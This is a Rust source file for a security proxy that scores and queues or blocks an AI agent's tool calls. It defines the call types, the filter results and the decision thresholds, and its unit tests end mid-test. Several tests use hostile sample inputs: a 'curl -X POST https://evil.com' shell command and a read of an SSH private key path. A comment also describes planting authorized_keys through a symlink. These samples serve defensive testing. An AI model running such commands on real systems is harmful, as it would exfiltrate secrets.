// SPDX-License-Identifier: MPL-2.0
// Copyright (c) grith contributors

//! Core proxy data types: tool call context, filter results, decisions, and severity.

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::fmt;
use std::sync::Mutex;
use std::sync::OnceLock;
use std::time::Duration;
use uuid::Uuid;

/// Key that scopes mutable filter state to a single supervised session (or LLM
/// conversation). All filters that maintain cross-call state — taint registry,
/// recent-sensitive-read map, rate-limit counters, behavioural baselines — key
/// by this scope so that fresh sessions cannot inherit state from earlier ones.
///
/// Derived from the session UUID at session start. See
/// `work/completed/61-pr1-session-scoped-state-work.md` for the design.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Hash)]
pub struct SessionScopeKey(Uuid);

impl SessionScopeKey {
    /// Construct a scope key from an existing session UUID. The supervisor and
    /// LLM paths both already carry a session UUID, so they use this to attach
    /// the same scope to every `ToolCallContext` in the session.
    pub fn from_session_id(id: Uuid) -> Self {
        Self(id)
    }

    /// Allocate a fresh scope key. Use only when no session UUID is available
    /// (e.g. internal proxy callers that don't belong to any session).
    pub fn fresh() -> Self {
        Self(Uuid::new_v4())
    }

    pub fn as_uuid(&self) -> Uuid {
        self.0
    }
}

impl fmt::Display for SessionScopeKey {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

/// Context for a single tool call being evaluated by the proxy.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolCallContext {
    pub id: Uuid,
    pub timestamp: DateTime<Utc>,
    pub plugin_id: String,
    pub call_type: ToolCallType,
    pub arguments: serde_json::Value,
    pub session_id: Uuid,
    pub task_context: Option<String>,
    pub call_sequence_number: u64,
    pub source_taint: TaintLevel,
    /// The supervisor profile name for this session, if any (e.g., "claude-code").
    /// Used by filters like `egress-policy` to apply per-profile destination policies.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub profile_name: Option<String>,
    /// Optional conversation-level identifier for long-running daemon contexts (e.g. OpenClaw).
    /// When set, taint tracking is scoped per conversation rather than per session,
    /// preventing taint bleed between sequential conversations on the same session.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub conversation_id: Option<String>,
    /// Per-session scope for mutable filter state. Populated by the supervisor
    /// at session start and by the LLM path at conversation start. When `None`,
    /// filters fall back to legacy unscoped behaviour and emit a `tracing::warn!`
    /// to make the gap visible during the PR 1 rollout. See PR 1 work doc.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub session_scope: Option<SessionScopeKey>,
    /// Provenance metadata for `ProcessSpawn` calls — canonical path,
    /// SHA-256 hash, component-writability walk, matched routine root,
    /// and outbound-capable flag. Populated by the supervisor when the
    /// spawn target is resolvable; consumed by `operation_risk.rs` to
    /// decide whether the spawn earns the +0.5 routine signal instead
    /// of the default +1.0 baseline. See PR 4 work doc.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub spawn_provenance: Option<SpawnProvenance>,
    /// PR 5 Phase C: match against the supervisor profile's
    /// `local_listener_policy`. `None` means the bind was not
    /// pre-declared by the profile (egress-policy treats as
    /// queue/deny). `Some(_)` means the bind matched a declared
    /// `(port, family)` entry — `allow_clamp` controls whether
    /// `0.0.0.0`/`::` binds are rewritten to loopback (Phase D)
    /// or merely allowed loopback-only with queue on wildcard.
    ///
    /// Populated by the supervisor's event_handler when classifying
    /// a `NetListen` syscall; consumed by `egress_policy.rs`.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub listener_policy_match: Option<ListenerPolicyMatch>,
}

/// PR 5 Phase C: structured signal from the supervisor profile's
/// `local_listener_policy` to the proxy. The supervisor pre-computes
/// this match (port + family) before evaluating the proxy so the
/// filter pipeline doesn't need to know the profile schema.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ListenerPolicyMatch {
    /// The matching entry's `allow_clamp` flag. When `true` and the
    /// bind is wildcard, the supervisor will rewrite the sockaddr to
    /// loopback at syscall-argument level (Phase D). When `false`,
    /// wildcard binds still queue even with a declaration.
    pub allow_clamp: bool,
    /// Profile-declared description, surfaced in audit logs + the
    /// dashboard "Listener rewrites" view. Forwarded verbatim from
    /// the matching `LocalListenerEntry::desc`.
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub desc: String,
}

/// Classification of a unix-domain socket target, stamped by the
/// supervisor into `ToolCallContext.arguments["unix_socket_class"]`
/// (via [`UnixSocketClass::KEY`]) and consumed by the filters through
/// [`ToolCallContext::unix_socket_class`].
///
/// Deliberately a **whitelist**: an address that matches neither
/// classifier carries no key, the accessor returns `None`, and every
/// filter falls through to its pre-existing (network-shaped) scoring.
/// A labelling bug therefore fails toward over-scoring, never toward a
/// silent allow. Only [`Control`](UnixSocketClass::Control) de-scores;
/// [`Privileged`](UnixSocketClass::Privileged) exists so filters can be
/// explicit that daemon control sockets keep full network-grade
/// scrutiny (an accidental `!= Privileged` guard would silently cover
/// the unlabelled case too).
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum UnixSocketClass {
    /// Root/host-daemon control socket (docker.sock, containerd, libvirt,
    /// `systemd/private`, ...): RCE-equivalent control of a privileged
    /// daemon whose work runs outside the supervised tree. Scored like a
    /// network destination — review-worthy on every unknown access.
    Privileged,
    /// Desktop control-injection IPC socket (session D-Bus, X11, tmux,
    /// screen): local IPC that routine desktop tooling touches constantly
    /// (keyring reads, clipboard, notifications) but that can also drive a
    /// more-privileged peer. Scored as local IPC by the generic filters;
    /// review pressure comes from the supervisor's dedicated
    /// control-socket escalation, not from hostname-shaped scoring.
    Control,
}

impl UnixSocketClass {
    /// The `ToolCallContext.arguments` key carrying the classification.
    pub const KEY: &'static str = "unix_socket_class";

    /// Stable string value stored under [`Self::KEY`].
    pub fn as_str(&self) -> &'static str {
        match self {
            UnixSocketClass::Privileged => "privileged",
            UnixSocketClass::Control => "control",
        }
    }

    /// Parse the stored string value; unknown values are `None` (treated
    /// as unlabelled — the fail-safe direction).
    pub fn from_str_value(value: &str) -> Option<Self> {
        match value {
            "privileged" => Some(UnixSocketClass::Privileged),
            "control" => Some(UnixSocketClass::Control),
            _ => None,
        }
    }
}

/// PR 4: structured provenance metadata for a `ProcessSpawn`, computed
/// by the supervisor and consumed by `operation_risk.rs` to decide
/// whether the spawn earns the +0.5 routine signal.
///
/// All five fields are independent gates — the routine signal applies
/// only when (a) `matched_routine_root.is_some()`, (b) every
/// `component_writability` entry has safe permissions, (c)
/// `is_outbound_capable` is false, (d) argv doesn't reference tainted
/// paths/env vars (checked separately by the filter), and (e) for
/// user-owned roots, the canonical path + SHA-256 was in the session-
/// pinned inventory at session start.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct SpawnProvenance {
    /// Canonical (symlink-resolved) absolute path of the executable.
    pub canonical_path: String,
    /// SHA-256 of the executable file's contents at the time the
    /// supervisor computed provenance. Hex-encoded for serde
    /// compatibility (the dashboard surfaces this string directly).
    pub sha256: String,
    /// Owning UID of the binary file itself.
    pub owner_uid: u32,
    /// Owning GID of the binary file itself.
    pub owner_gid: u32,
    /// File mode (permission + type bits) of the binary itself.
    pub mode: u32,
    /// Permission walk over every path component from `/` down to the
    /// binary. Any unsafe entry rejects the routine signal.
    pub component_writability: Vec<ComponentWritability>,
    /// The profile-declared `routine_exec_roots` entry whose prefix
    /// the canonical path matched. `None` when the canonical path
    /// isn't under any declared root.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub matched_routine_root: Option<String>,
    /// Whether the canonical path is on PR 2's curated outbound-
    /// capable list. Set by the supervisor at provenance-computation
    /// time so the proxy filter doesn't have to re-classify.
    pub is_outbound_capable: bool,
}

/// PR 4: writability properties of one path component along the way
/// to a spawned binary. Used by the routine-signal check to reject
/// binaries reachable through directories that other principals can
/// write to.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ComponentWritability {
    /// The component's absolute path (cumulative from root).
    pub path: String,
    /// Owning UID of the component.
    pub owner_uid: u32,
    /// Whether the component is writable by "other" (`mode & 0o002`).
    /// Always disqualifies the routine signal.
    pub other_writable: bool,
    /// Whether the component is writable by "group" AND owned by uid 0
    /// (`mode & 0o020 && uid == 0`). Disqualifies — root-owned-group-
    /// writable directories let group members inject binaries.
    pub group_writable_non_root: bool,
    /// Whether the component is world-writable. Redundant with
    /// `other_writable` but recorded distinctly for audit-log clarity.
    pub world_writable: bool,
}

/// The type of tool call being made.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(tag = "type")]
pub enum ToolCallType {
    FileRead {
        path: String,
    },
    FileWrite {
        path: String,
        content_hash: String,
    },
    FileAppend {
        path: String,
    },
    FileDelete {
        path: String,
    },
    DirList {
        path: String,
    },
    ShellExec {
        command: String,
        args: Vec<String>,
    },
    HttpRequest {
        method: String,
        url: String,
    },
    // v1.5: Supervisor-originated variants (mapped from OS syscalls)
    FileRename {
        old_path: String,
        new_path: String,
    },
    /// Symbolic or hard link creation (`symlink`/`symlinkat`/`link`/`linkat`).
    ///
    /// Scored by the link **target**, not the link path: creating
    /// `/tmp/x -> ~/.ssh/id_rsa` is the moment a sensitive path becomes
    /// reachable under a benign name, so `path()` returns the target and
    /// every path-based filter evaluates what is being exposed rather than
    /// where it is being exposed to (go-live review B2/B3).
    FileLink {
        /// What the link points at — the sensitive side.
        target: String,
        /// The new name being created.
        link_path: String,
        /// `true` for `symlink`/`symlinkat`, `false` for `link`/`linkat`.
        symbolic: bool,
    },
    FileChmod {
        path: String,
        mode: u32,
    },
    DirCreate {
        path: String,
    },
    NetConnect {
        address: String,
        port: u16,
    },
    NetListen {
        address: String,
        port: u16,
    },
    ProcessSpawn {
        command: String,
        args: Vec<String>,
    },
    /// DNS query intercepted by the DNS inspection proxy.
    DnsQuery {
        domain: String,
        query_type: String,
    },
    /// PR 6 Phase B: chown-family ownership change. Routed to the
    /// operation-risk filter for a `+5.0` baseline so any chown
    /// outside profile-declared scope queues for review.
    OwnershipChange {
        /// Target path. For fd-based ownership changes the supervisor
        /// reports the fd-resolved path when known, otherwise a
        /// `<fd:N>` placeholder.
        target: String,
        /// New owner uid, `-1` for "leave unchanged".
        new_uid: i64,
        /// New group gid, `-1` for "leave unchanged".
        new_gid: i64,
    },
    /// PR 6 Phase B: mount, chroot, pivot-root, and new-mount-API
    /// filesystem mutation. Routed for `+5.0` baseline. Defeats
    /// path-filter bypass via remount or root/view reshaping.
    FilesystemMutation {
        /// Operation tag, such as "mount", "umount2", "pivotroot",
        /// "chroot", "opentree", "movemount", or "mountsetattr".
        op: String,
        /// Source path when available. `None` for fd/context-only
        /// operations.
        source: Option<String>,
        /// Target mount point, new root, path, or fd/context
        /// placeholder for fd-only operations.
        target: String,
        /// Filesystem type or context key when available.
        fstype: Option<String>,
    },
    /// PR 6 Phase B: ptrace + process_vm_readv/writev against a
    /// non-self target. `+5.0` baseline.
    CrossProcessAccess {
        /// Operation tag — "ptrace", "process_vm_readv", or
        /// "process_vm_writev".
        op: String,
        /// Target pid (never the caller's own pid).
        target_pid: u32,
    },
    /// PR 6 Phase C: `unshare(2)` / `setns(2)` namespace primitive.
    /// `+5.0` baseline; routine-binary carveout in the supervisor
    /// skips this evaluation entirely when the calling binary is on
    /// the profile's `namespace_users` list.
    NamespaceOp {
        /// Syscall tag — "unshare" or "setns".
        syscall: String,
        /// `CLONE_NEW*` flag bitmap (unshare) or `nstype` (setns).
        flags: u64,
    },
    /// A D-Bus method call the supervisor decoded from a write to a control
    /// socket, and which its curated allowlist does not vouch for.
    ///
    /// Only calls that reach a prompt arrive here: an allowlisted call is
    /// resumed in the interceptor without a proxy round trip. `+5.0` baseline,
    /// the same weight as the other authority-delegating operations, so an
    /// undeclared bus method QUEUEs for review.
    DbusMethodCall {
        /// Rendered bus socket, e.g. `unix:/run/user/1000/bus`.
        socket: String,
        /// Bus name being addressed, e.g. `org.freedesktop.systemd1`.
        destination: Option<String>,
        /// Interface, e.g. `org.freedesktop.systemd1.Manager`.
        interface: Option<String>,
        /// Method name, e.g. `StartTransientUnit`.
        member: Option<String>,
    },
}

/// Result from a single security filter evaluation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FilterResult {
    /// Name of the filter that produced this result.
    pub filter_name: String,
    /// Whether the filter matched (contributed a non-zero score).
    pub matched: bool,
    /// Score contribution from this filter.
    pub score: f64,
    /// Identifier of the specific rule that matched.
    pub rule_id: String,
    /// Severity level of the match.
    pub severity: Severity,
    /// Human-readable description of the match.
    pub message: String,
    /// Arbitrary key-value metadata from the filter.
    pub metadata: HashMap<String, serde_json::Value>,
}

/// The final decision from the proxy pipeline.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProxyDecision {
    /// Final action (allow / queue / deny).
    pub action: ProxyAction,
    /// Sum of all filter scores after meta-rule adjustments.
    pub composite_score: f64,
    /// Per-filter evaluation breakdown.
    pub filter_results: Vec<FilterResult>,
    /// Wall-clock time spent in the evaluation pipeline.
    #[serde(with = "duration_ms")]
    pub evaluation_time: Duration,
    /// Human-readable explanation of the decision.
    pub decision_reason: String,
}

/// Action the proxy has decided to take.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum ProxyAction {
    /// Tool call is permitted.
    Allow,
    /// Tool call is queued for human review at the given priority.
    Queue { priority: QueuePriority },
    /// Tool call is blocked.
    Deny { reason: String },
}

/// Priority for queued digest items.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
pub enum QueuePriority {
    Low,
    Medium,
    High,
    Critical,
}

/// Severity of a filter match.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    Notice,
    Warning,
    Error,
    Critical,
}

/// Taint level for information flow tracking.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Default)]
pub enum TaintLevel {
    #[default]
    None,
    Low,
    Medium,
    High,
}

// --- Constructors ---

impl ToolCallContext {
    /// Create a new context with the given plugin, call type, and session.
    /// Derives `session_scope` from the session id; callers that need a
    /// different scope (e.g. an LLM path with its own conversation lifetime)
    /// should override via [`with_session_scope`].
    pub fn new(plugin_id: impl Into<String>, call_type: ToolCallType, session_id: Uuid) -> Self {
        Self {
            id: Uuid::new_v4(),
            timestamp: Utc::now(),
            plugin_id: plugin_id.into(),
            call_type,
            arguments: serde_json::Value::Null,
            session_id,
            task_context: None,
            call_sequence_number: 0,
            source_taint: TaintLevel::None,
            profile_name: None,
            conversation_id: None,
            session_scope: Some(SessionScopeKey::from_session_id(session_id)),
            spawn_provenance: None,
            listener_policy_match: None,
        }
    }

    /// Set the supervisor profile name for this context.
    pub fn with_profile(mut self, name: impl Into<String>) -> Self {
        self.profile_name = Some(name.into());
        self
    }

    /// The supervisor's unix-socket classification for this call, if any.
    ///
    /// Reads `arguments[UnixSocketClass::KEY]` (stamped by the supervisor's
    /// event handler for `NetConnect`/`NetListen` on `unix:` addresses; the
    /// key rides `arguments` so it survives the daemon IPC round-trip like
    /// the supervisor `pid` key does). `None` — no key, or an unknown
    /// value — means unlabelled: filters must score exactly as they did
    /// before the classification existed.
    pub fn unix_socket_class(&self) -> Option<UnixSocketClass> {
        self.arguments
            .get(UnixSocketClass::KEY)?
            .as_str()
            .and_then(UnixSocketClass::from_str_value)
    }

    /// Override the session scope. Use when the calling layer has a finer-grained
    /// lifetime than the session UUID (e.g. an LLM conversation that spans a
    /// shorter window than the daemon session).
    pub fn with_session_scope(mut self, scope: SessionScopeKey) -> Self {
        self.session_scope = Some(scope);
        self
    }

    /// Resolve the session scope for keying filter state, with a once-per-
    /// (session, filter) warn if the scope is missing.
    ///
    /// Filter authors call this with their filter name; the helper returns
    /// either the populated `session_scope` or — for legacy/IPC callers that
    /// don't yet populate it — a deterministic fallback derived from
    /// `session_id`. Because the fallback is deterministic, two calls within
    /// the same legacy session still hash to the same key, preserving the
    /// per-session isolation guarantee that PR 1 cares about, just without
    /// the explicit `session_scope` field.
    ///
    /// The warn is throttled per `(session_id, filter_name)` so an older
    /// supervisor sending many calls without `session_scope` does not spam
    /// the log.
    pub fn scope_or_warn(&self, filter_name: &'static str) -> SessionScopeKey {
        if let Some(scope) = self.session_scope {
            return scope;
        }
        warn_missing_scope_once(self.session_id, filter_name);
        SessionScopeKey::from_session_id(self.session_id)
    }

    /// Extract the primary path from the tool call, if any.
    pub fn path(&self) -> Option<&str> {
        match &self.call_type {
            ToolCallType::FileRead { path }
            | ToolCallType::FileWrite { path, .. }
            | ToolCallType::FileAppend { path }
            | ToolCallType::FileDelete { path }
            | ToolCallType::DirList { path }
            | ToolCallType::FileChmod { path, .. }
            | ToolCallType::DirCreate { path } => Some(path),
            ToolCallType::FileRename { old_path, .. } => Some(old_path),
            // Link creation is scored by what it exposes, not by the new
            // name — see the `FileLink` variant docs.
            ToolCallType::FileLink { target, .. }
            | ToolCallType::OwnershipChange { target, .. }
            | ToolCallType::FilesystemMutation { target, .. } => Some(target),
            _ => None,
        }
    }

    /// Every path this call touches that policy must see, not just the
    /// primary one from [`path`](Self::path).
    ///
    /// Link creation has two: the target it exposes, and the name being
    /// created. Scoring only the target would make `ln -s ./mine
    /// ~/.ssh/authorized_keys` cheaper than writing that file directly —
    /// link creation would become the preferred way to plant one. Filters
    /// that decide by path evaluate all of these and take the worst.
    pub fn paths(&self) -> Vec<&str> {
        match &self.call_type {
            ToolCallType::FileLink {
                target, link_path, ..
            } => vec![target.as_str(), link_path.as_str()],
            _ => self.path().into_iter().collect(),
        }
    }

    /// Extract the URL from the tool call, if any.
    pub fn url(&self) -> Option<&str> {
        match &self.call_type {
            ToolCallType::HttpRequest { url, .. } => Some(url),
            _ => None,
        }
    }

    /// Extract the command from the tool call, if any.
    pub fn command(&self) -> Option<&str> {
        match &self.call_type {
            ToolCallType::ShellExec { command, .. }
            | ToolCallType::ProcessSpawn { command, .. } => Some(command),
            _ => None,
        }
    }

    /// Full shell command string (command + args joined).
    pub fn full_command(&self) -> Option<String> {
        match &self.call_type {
            ToolCallType::ShellExec { command, args }
            | ToolCallType::ProcessSpawn { command, args } => {
                if args.is_empty() {
                    Some(command.clone())
                } else {
                    Some(format!("{} {}", command, args.join(" ")))
                }
            }
            _ => None,
        }
    }

    /// Extract the network address from the tool call, if any.
    pub fn address(&self) -> Option<(&str, u16)> {
        match &self.call_type {
            ToolCallType::NetConnect { address, port }
            | ToolCallType::NetListen { address, port } => Some((address, *port)),
            _ => None,
        }
    }
}

/// Set of `(session_id, filter_name)` pairs that have already produced a
/// missing-scope warning, so each filter logs at most once per session.
///
/// Memory bound: `ToolCallContext::new` populates `session_scope`, so this
/// path is only reached by legacy IPC clients that explicitly omit the
/// field. With three scoping filters today (taint, rate_limit, behavioural),
/// the worst case is `3 × N_legacy_sessions × ~50 bytes` — self-limiting
/// once clients upgrade. No eviction needed.
fn warn_missing_scope_once(session_id: Uuid, filter_name: &'static str) {
    static SEEN: OnceLock<Mutex<HashSet<(Uuid, &'static str)>>> = OnceLock::new();
    let seen = SEEN.get_or_init(|| Mutex::new(HashSet::new()));
    let mut guard = match seen.lock() {
        Ok(g) => g,
        Err(poisoned) => poisoned.into_inner(),
    };
    if guard.insert((session_id, filter_name)) {
        tracing::warn!(
            session_id = %session_id,
            filter = filter_name,
            "ToolCallContext.session_scope is None; falling back to session-id-derived scope. Caller should populate session_scope for clean keying.",
        );
    }
}

impl FilterResult {
    pub fn no_match(filter_name: &str) -> Self {
        Self {
            filter_name: filter_name.to_string(),
            matched: false,
            score: 0.0,
            rule_id: String::new(),
            severity: Severity::Notice,
            message: String::new(),
            metadata: HashMap::new(),
        }
    }

    pub fn matched(
        filter_name: &str,
        rule_id: &str,
        score: f64,
        severity: Severity,
        message: impl Into<String>,
    ) -> Self {
        Self {
            filter_name: filter_name.to_string(),
            matched: true,
            score,
            rule_id: rule_id.to_string(),
            severity,
            message: message.into(),
            metadata: HashMap::new(),
        }
    }
}

impl ProxyDecision {
    pub fn allow(score: f64, results: Vec<FilterResult>, time: Duration) -> Self {
        Self {
            action: ProxyAction::Allow,
            composite_score: score,
            decision_reason: format!("Score {score:.1} below allow threshold"),
            filter_results: results,
            evaluation_time: time,
        }
    }

    pub fn queue(score: f64, results: Vec<FilterResult>, time: Duration) -> Self {
        let priority = match score {
            s if s >= 7.0 => QueuePriority::Critical,
            s if s >= 5.5 => QueuePriority::High,
            s if s >= 4.0 => QueuePriority::Medium,
            _ => QueuePriority::Low,
        };
        Self {
            action: ProxyAction::Queue { priority },
            composite_score: score,
            decision_reason: format!("Score {score:.1} in escalation zone"),
            filter_results: results,
            evaluation_time: time,
        }
    }

    pub fn deny(score: f64, results: Vec<FilterResult>, reason: String, time: Duration) -> Self {
        Self {
            action: ProxyAction::Deny {
                reason: reason.clone(),
            },
            composite_score: score,
            decision_reason: reason,
            filter_results: results,
            evaluation_time: time,
        }
    }

    pub fn is_allowed(&self) -> bool {
        self.action == ProxyAction::Allow
    }

    pub fn is_denied(&self) -> bool {
        matches!(self.action, ProxyAction::Deny { .. })
    }
}

/// Serde helper for Duration as milliseconds.
mod duration_ms {
    use serde::{Deserialize, Deserializer, Serialize, Serializer};
    use std::time::Duration;

    pub fn serialize<S: Serializer>(duration: &Duration, s: S) -> Result<S::Ok, S::Error> {
        duration.as_secs_f64().serialize(s)
    }

    pub fn deserialize<'de, D: Deserializer<'de>>(d: D) -> Result<Duration, D::Error> {
        let secs = f64::deserialize(d)?;
        Ok(Duration::from_secs_f64(secs))
    }
}

impl ToolCallType {
    /// Resolve `..`, `.` and symlinks in every path this call carries, so
    /// filters match on what will actually be touched rather than on the
    /// string that was requested (go-live review B3).
    ///
    /// For the LLM path this is exact: the built-in agent executes the
    /// operation in this process, so resolving here both closes the
    /// laundering hole and removes the window between scoring one path and
    /// executing another. Supervisor-originated calls arrive already
    /// resolved against the tracee's cwd and are unaffected by a second
    /// pass.
    ///
    /// Follow semantics match the kernel's: operations that act on a link
    /// itself (delete, rename, and a new link's name) keep their final
    /// component, so a delete is never reported as a delete of the target.
    #[must_use]
    pub fn resolve_paths(self) -> Self {
        use crate::path_resolution::{resolve_follow, resolve_nofollow};
        match self {
            Self::FileRead { path } => Self::FileRead {
                path: resolve_follow(&path),
            },
            Self::FileWrite { path, content_hash } => Self::FileWrite {
                path: resolve_follow(&path),
                content_hash,
            },
            Self::FileAppend { path } => Self::FileAppend {
                path: resolve_follow(&path),
            },
            Self::DirList { path } => Self::DirList {
                path: resolve_follow(&path),
            },
            Self::DirCreate { path } => Self::DirCreate {
                path: resolve_follow(&path),
            },
            Self::FileChmod { path, mode } => Self::FileChmod {
                path: resolve_follow(&path),
                mode,
            },
            // Acts on the link, not its target.
            Self::FileDelete { path } => Self::FileDelete {
                path: resolve_nofollow(&path),
            },
            Self::FileRename { old_path, new_path } => Self::FileRename {
                old_path: resolve_nofollow(&old_path),
                new_path: resolve_nofollow(&new_path),
            },
            // The target is what a later open will follow; the new name does
            // not exist yet.
            Self::FileLink {
                target,
                link_path,
                symbolic,
            } => Self::FileLink {
                target: resolve_follow(&target),
                link_path: resolve_nofollow(&link_path),
                symbolic,
            },
            // No path component.
            other => other,
        }
    }
}

/// Render ambiguous shared-IP DNS attribution candidates as the canonical
/// JSON string array carried in `NetConnect.address` (for example
/// `["a.example.com","b.example.com"]`). The supervisor produces this form
/// when a connect targets an IP that multiple observed hostnames resolve to;
/// consumers recover the candidates with [`parse_dns_candidate_array`].
pub fn format_dns_candidate_array(candidates: &[String]) -> String {
    serde_json::to_string(candidates).unwrap_or_else(|_| {
        format!(
            "[{}]",
            candidates
                .iter()
                .map(|candidate| format!("{candidate:?}"))
                .collect::<Vec<_>>()
                .join(",")
        )
    })
}

/// Parse a `NetConnect` address (or a `net:`-stripped allowlist key) that may
/// carry the ambiguous DNS attribution array produced by
/// [`format_dns_candidate_array`].
///
/// Returns `None` for anything that is not a well-formed, non-empty JSON
/// string array — including an empty `[]` — so malformed input degrades to
/// being treated as an opaque single host (which scores as an unknown
/// destination downstream) rather than silently matching nothing.
pub fn parse_dns_candidate_array(value: &str) -> Option<Vec<String>> {
    if !value.starts_with('[') {
        return None;
    }
    let candidates: Vec<String> = serde_json::from_str(value).ok()?;
    if candidates.is_empty() {
        return None;
    }
    Some(candidates)
}

impl std::fmt::Display for ToolCallType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::FileRead { path } => write!(f, "FileRead({path})"),
            Self::FileWrite { path, .. } => write!(f, "FileWrite({path})"),
            Self::FileAppend { path } => write!(f, "FileAppend({path})"),
            Self::FileDelete { path } => write!(f, "FileDelete({path})"),
            Self::DirList { path } => write!(f, "DirList({path})"),
            Self::ShellExec { command, args } => {
                write!(f, "ShellExec({command} {})", args.join(" "))
            }
            Self::HttpRequest { method, url } => write!(f, "HttpRequest({method} {url})"),
            Self::FileRename {
                old_path, new_path, ..
            } => write!(f, "FileRename({old_path} -> {new_path})"),
            Self::FileLink {
                target,
                link_path,
                symbolic,
            } => write!(
                f,
                "FileLink({kind} {link_path} -> {target})",
                kind = if *symbolic { "symbolic" } else { "hard" }
            ),
            Self::FileChmod { path, mode } => write!(f, "FileChmod({path}, {mode:o})"),
            Self::DirCreate { path } => write!(f, "DirCreate({path})"),
            Self::NetConnect { address, port } => write!(f, "NetConnect({address}:{port})"),
            Self::NetListen { address, port } => write!(f, "NetListen({address}:{port})"),
            Self::ProcessSpawn { command, args } => {
                write!(f, "ProcessSpawn({command} {})", args.join(" "))
            }
            Self::DnsQuery { domain, query_type } => {
                write!(f, "DnsQuery({domain} {query_type})")
            }
            Self::OwnershipChange {
                target,
                new_uid,
                new_gid,
            } => write!(f, "OwnershipChange({target} uid={new_uid} gid={new_gid})"),
            Self::FilesystemMutation {
                op,
                source,
                target,
                fstype,
            } => write!(
                f,
                "FilesystemMutation({op} src={src} target={target} fstype={fs})",
                src = source.as_deref().unwrap_or(""),
                fs = fstype.as_deref().unwrap_or(""),
            ),
            Self::CrossProcessAccess { op, target_pid } => {
                write!(f, "CrossProcessAccess({op} target_pid={target_pid})")
            }
            Self::NamespaceOp { syscall, flags } => {
                write!(f, "NamespaceOp({syscall} flags={flags:#x})")
            }
            Self::DbusMethodCall {
                socket,
                destination,
                interface,
                member,
            } => {
                let dest = destination.as_deref().unwrap_or("?");
                let iface = interface.as_deref().unwrap_or("?");
                let member = member.as_deref().unwrap_or("?");
                write!(f, "DbusMethodCall({socket} {dest} {iface}.{member})")
            }
        }
    }
}

impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Notice => write!(f, "notice"),
            Self::Warning => write!(f, "warning"),
            Self::Error => write!(f, "error"),
            Self::Critical => write!(f, "critical"),
        }
    }
}

impl std::fmt::Display for ProxyAction {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Allow => write!(f, "allow"),
            Self::Queue { priority } => write!(f, "queue({priority:?})"),
            Self::Deny { reason } => write!(f, "deny({reason})"),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_session() -> Uuid {
        Uuid::new_v4()
    }

    #[test]
    fn test_tool_call_context_path_extraction() {
        let ctx = ToolCallContext::new(
            "test-plugin",
            ToolCallType::FileRead {
                path: "/home/user/.ssh/id_rsa".into(),
            },
            test_session(),
        );
        assert_eq!(ctx.path(), Some("/home/user/.ssh/id_rsa"));
        assert_eq!(ctx.url(), None);
        assert_eq!(ctx.command(), None);
    }

    #[test]
    fn test_tool_call_context_command_extraction() {
        let ctx = ToolCallContext::new(
            "test-plugin",
            ToolCallType::ShellExec {
                command: "curl".into(),
                args: vec!["-X".into(), "POST".into(), "https://evil.com".into()],
            },
            test_session(),
        );
        assert_eq!(ctx.command(), Some("curl"));
        assert_eq!(
            ctx.full_command(),
            Some("curl -X POST https://evil.com".into())
        );
    }

    #[test]
    fn test_tool_call_context_url_extraction() {
        let ctx = ToolCallContext::new(
            "test-plugin",
            ToolCallType::HttpRequest {
                method: "GET".into(),
                url: "https://api.example.com".into(),
            },
            test_session(),
        );
        assert_eq!(ctx.url(), Some("https://api.example.com"));
        assert_eq!(ctx.path(), None);
    }

    #[test]
    fn test_filter_result_no_match() {
        let result = FilterResult::no_match("path-match");
        assert!(!result.matched);
        assert_eq!(result.score, 0.0);
    }

    #[test]
    fn test_filter_result_matched() {
        let result = FilterResult::matched(
            "path-match",
            "ssh-private-key",
            5.0,
            Severity::Critical,
            "Access to SSH private key",
        );
        assert!(result.matched);
        assert_eq!(result.score, 5.0);
        assert_eq!(result.severity, Severity::Critical);
    }

    #[test]
    fn test_proxy_decision_allow() {
        let decision = ProxyDecision::allow(1.5, vec![], Duration::from_millis(2));
        assert!(decision.is_allowed());
        assert!(!decision.is_denied());
        assert_eq!(decision.composite_score, 1.5);
    }

    #[test]
    fn test_proxy_decision_queue_priority() {
        let low = ProxyDecision::queue(3.5, vec![], Duration::from_millis(5));
        assert!(matches!(
            low.action,
            ProxyAction::Queue {
                priority: QueuePriority::Low
            }
        ));

        let high = ProxyDecision::queue(6.0, vec![], Duration::from_millis(5));
        assert!(matches!(
            high.action,
            ProxyAction::Queue {
                priority: QueuePriority::High
            }
        ));

        let critical = ProxyDecision::queue(7.5, vec![], Duration::from_millis(5));
        assert!(matches!(
            critical.action,
            ProxyAction::Queue {
                priority: QueuePriority::Critical
            }
        ));
    }

    #[test]
    fn test_proxy_decision_deny() {
        let decision = ProxyDecision::deny(
            9.0,
            vec![],
            "SSH key access".into(),
            Duration::from_millis(1),
        );
